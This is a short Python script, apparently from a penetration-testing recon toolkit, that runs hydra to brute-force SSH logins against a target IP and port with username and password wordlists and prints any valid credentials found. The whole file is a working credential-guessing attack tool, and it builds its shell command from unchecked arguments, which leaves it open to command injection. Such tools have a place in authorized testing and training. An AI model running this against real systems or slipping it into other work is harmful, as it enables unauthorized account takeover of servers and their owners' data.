#!/usr/bin/env python
import subprocess
import sys
import argparse

def ssh_scan(ip_address, port, output_dir):
        print "INFO: Performing hydra ssh scan against " + ip_address  + ":" + port
        HYDRA = "hydra -L /media/sf_Shared/scripts/enumeration/recon_scan/bin/top_shortlist.txt -P /media/sf_Shared/scripts/enumeration/recon_scan/bin/wordlists/offsecpass -f -o %s/%s_sshhydra.txt -u %s -s %s ssh" % (output_dir,ip_address, ip_address, port)
        try:
            results = subprocess.check_output(HYDRA, shell=True)
            resultarr = results.split("\n")
            for result in resultarr:
                if "login:" in result:
                        print "[*] Valid ssh credentials found: " + result 
        except:
            print "INFO: No valid ssh credentials found"


def usage():
        print "\n./sshrecon.py -i <ip_address> -p <port> -d <output_dir>\n"

if __name__=='__main__':
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", help="Designates target ip")
        parser.add_argument("-p", help="Designates target port")
        parser.add_argument("-d", help="Designates output_directory")
        args = parser.parse_args()
        if args.i == None or args.d == None or args.p == None:
                usage()
        else:
                ssh_scan(args.i.strip(),args.p.strip(),args.d.strip())
